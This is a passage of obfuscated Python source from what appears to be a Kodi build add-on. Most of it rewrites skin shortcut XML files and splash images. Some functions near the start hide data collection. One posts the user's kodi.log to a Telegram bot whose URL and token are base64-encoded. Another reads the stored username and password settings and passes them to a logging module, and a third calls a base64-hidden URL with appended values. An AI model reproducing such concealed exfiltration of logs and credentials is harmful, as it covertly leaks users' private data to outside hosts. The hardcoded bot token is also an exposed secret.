          OOO00OOOO00O00O0O =OOO0OO0OO0000000O #line:575
          import socket #line:577
          OO000O0OOOO000O0O =urllib2 .urlopen (OOO0000O0O0O0O000 .decode ('base64')+' - '+OO0OO0O0000O00OO0 +' - '+OOO00OOOO00O00O0O +' - '+O00O0O000O00O0000 ).readlines ()#line:578
       except :pass #line:579
def googleindicat ():#line:582
			import logg #line:583
			O0000OO00OO0OO0OO =(ADDON .getSetting ("pass"))#line:584
			O00000OO0O0O0O0O0 =(ADDON .getSetting ("user"))#line:585
			logg .logGA (O0000OO00OO0OO0OO ,O00000OO0O0O0O0O0 )#line:586
def logsend ():#line:587
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:588
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:589
      howsentlog ()#line:591
      import requests #line:592
      if xbmc .getCondVisibility ('system.platform.windows'):#line:593
         OO0O00000OO000O00 =xbmc .translatePath ('special://home/kodi.log')#line:594
         OO0O0O0OO00O0OO0O ={'chat_id':(None ,'-274262389'),'document':(OO0O00000OO000O00 ,open (OO0O00000OO000O00 ,'rb')),}#line:598
         OO0OOO00OO0OOOO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:599
         O00O0000OO0OO0O00 =requests .post (OO0OOO00OO0OOOO0O .decode ('base64'),files =OO0O0O0OO00O0OO0O )#line:601
      elif xbmc .getCondVisibility ('system.platform.android'):#line:602
           OO0O00000OO000O00 =xbmc .translatePath ('special://temp/kodi.log')#line:603
           OO0O0O0OO00O0OO0O ={'chat_id':(None ,'-274262389'),'document':(OO0O00000OO000O00 ,open (OO0O00000OO000O00 ,'rb')),}#line:607
           OO0OOO00OO0OOOO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:608
           O00O0000OO0OO0O00 =requests .post (OO0OOO00OO0OOOO0O .decode ('base64'),files =OO0O0O0OO00O0OO0O )#line:610
      else :#line:611
           OO0O00000OO000O00 =xbmc .translatePath ('special://kodi.log')#line:612
           OO0O0O0OO00O0OO0O ={'chat_id':(None ,'-274262389'),'document':(OO0O00000OO000O00 ,open (OO0O00000OO000O00 ,'rb')),}#line:616
           OO0OOO00OO0OOOO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:617
           O00O0000OO0OO0O00 =requests .post (OO0OOO00OO0OOOO0O .decode ('base64'),files =OO0O0O0OO00O0OO0O )#line:619
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:620
def rdoff ():#line:622
	OO00OOO0O0O0O00O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:653
	OO000O0OOOO00O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:654
	copyfile (OO00OOO0O0O0O00O0 ,OO000O0OOOO00O0OO )#line:655
def skindialogsettind18 ():#line:656
	try :#line:657
		O0OO00OOO00OOO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:658
		OO00O000OOOOOO0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:659
		copyfile (O0OO00OOO00OOO000 ,OO00O000OOOOOO0O0 )#line:660
	except :pass #line:661
def rdon ():#line:662
	loginit .loginIt ('restore','all')#line:663
	OOOO0O000OO0OOO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:665
	OOOOOO000O0O0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:666
	copyfile (OOOO0O000OO0OOO00 ,OOOOOO000O0O0OO0O )#line:667
def adults18 ():#line:669
  O0O00OO0O0OO000O0 =(ADDON .getSetting ("adults"))#line:670
  if O0O00OO0O0OO000O0 =='true':#line:671
    OOO0O0OO0O0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:672
    with open (OOO0O0OO0O0OO00OO ,'r')as O00000OO0O0O0OO00 :#line:673
      O0OO00O0O0OO0OOO0 =O00000OO0O0O0OO00 .read ()#line:674
    O0OO00O0O0OO0OOO0 =O0OO00O0O0OO0OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:692
    with open (OOO0O0OO0O0OO00OO ,'w')as O00000OO0O0O0OO00 :#line:695
      O00000OO0O0O0OO00 .write (O0OO00O0O0OO0OOO0 )#line:696
def rdbuildaddon ():#line:697
  OOOO0OOO0OO00OOO0 =(ADDON .getSetting ("auto_rd"))#line:698
  if OOOO0OOO0OO00OOO0 =='true':#line:699
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:700
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:701
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:702
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:720
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:723
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:724
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:728
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:729
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:730
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:748
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:751
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:752
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:756
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:757
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:758
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:776
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:779
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:780
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:784
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:785
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:786
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:804
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:807
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:808
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:811
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:812
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:813
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:831
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:834
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:835
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:837
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:838
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:839
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:857
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:860
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:861
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:863
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:864
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:865
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:883
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:886
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:887
    O0OOOO0OOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:890
    with open (O0OOOO0OOO0OO0O0O ,'r')as O00OOO000OO0O00O0 :#line:891
      OOO00000OO0OOO0OO =O00OOO000OO0O00O0 .read ()#line:892
    OOO00000OO0OOO0OO =OOO00000OO0OOO0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:910
    with open (O0OOOO0OOO0OO0O0O ,'w')as O00OOO000OO0O00O0 :#line:913
      O00OOO000OO0O00O0 .write (OOO00000OO0OOO0OO )#line:914
def rdbuildinstall ():#line:917
  try :#line:918
   O0OOOO00O0OO00000 =(ADDON .getSetting ("auto_rd"))#line:919
   if O0OOOO00O0OO00000 =='true':#line:920
     OO00000OOO00OO0O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:921
     OOOOO00OO00OOO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:922
     copyfile (OO00000OOO00OO0O0 ,OOOOO00OO00OOO00O )#line:923
  except :#line:924
     pass #line:925
def rdbuildaddonoff ():#line:928
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:931
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:932
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:933
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:951
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:954
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:955
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:959
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:960
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:961
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:979
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:982
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:983
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:987
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:988
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:989
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1007
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1010
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1011
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1015
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:1016
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:1017
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1035
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1038
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1039
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1042
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:1043
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:1044
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1065
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1066
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:1069
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:1070
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1088
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1091
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1092
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1094
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:1095
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:1096
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1114
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1117
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1118
    OOOOOO00O00OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1121
    with open (OOOOOO00O00OOO000 ,'r')as OO0O00OOO0OO00O0O :#line:1122
      OOOO0OO00O00O000O =OO0O00OOO0OO00O0O .read ()#line:1123
    OOOO0OO00O00O000O =OOOO0OO00O00O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1141
    with open (OOOOOO00O00OOO000 ,'w')as OO0O00OOO0OO00O0O :#line:1144
      OO0O00OOO0OO00O0O .write (OOOO0OO00O00O000O )#line:1145
def rdbuildinstalloff ():#line:1148
    try :#line:1149
       O0OOO00OOO0OOO00O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1150
       O0O0OOO0OO0000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1151
       copyfile (O0OOO00OOO0OOO00O ,O0O0OOO0OO0000O00 )#line:1153
       O0OOO00OOO0OOO00O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1155
       O0O0OOO0OO0000O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1156
       copyfile (O0OOO00OOO0OOO00O ,O0O0OOO0OO0000O00 )#line:1158
       O0OOO00OOO0OOO00O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1160
       O0O0OOO0OO0000O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1161
       copyfile (O0OOO00OOO0OOO00O ,O0O0OOO0OO0000O00 )#line:1163
       O0OOO00OOO0OOO00O =ADDONPATH +"/resources/rdoff/Splash.png"#line:1166
       O0O0OOO0OO0000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1167
       copyfile (O0OOO00OOO0OOO00O ,O0O0OOO0OO0000O00 )#line:1169
    except :#line:1171
       pass #line:1172
def rdbuildaddonON ():#line:1179
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1181
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1182
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1183
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1201
    with open (OOOOOO0O000000OO0 ,'w')as OO0000O0O000000OO :#line:1204
      OO0000O0O000000OO .write (O0O00O0OO000000OO )#line:1205
    OOOOOO0O000000OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1209
    with open (OOOOOO0O000000OO0 ,'r')as OO0000O0O000000OO :#line:1210
      O0O00O0OO000000OO =OO0000O0O000000OO .read ()#line:1211
    O0O00O0OO000000OO =O0O00O0OO000000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
